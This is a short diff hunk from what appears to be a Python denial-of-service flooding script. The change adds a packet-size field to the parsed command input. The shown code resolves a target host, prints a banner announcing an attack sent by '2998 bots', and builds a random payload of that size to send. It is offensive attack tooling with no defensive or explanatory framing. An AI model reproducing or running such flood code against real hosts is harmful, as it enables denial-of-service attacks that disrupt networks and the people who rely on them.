@@ -313,7 +313,7 @@ def main():
 				main()
 			else:
 				try:
-					sinput, host, port, timer = sin.split(" ")
+					sinput, host, port, timer, pack = sin.split(" ")
 					socket.gethostbyname(host)
 					print ("\x1b[1;35m[+] Attack Has Been sent \x1b[1;32m2998 \x1b[1;35mbots [+]".format (host))
 					punch = random._urandom(int(pack))
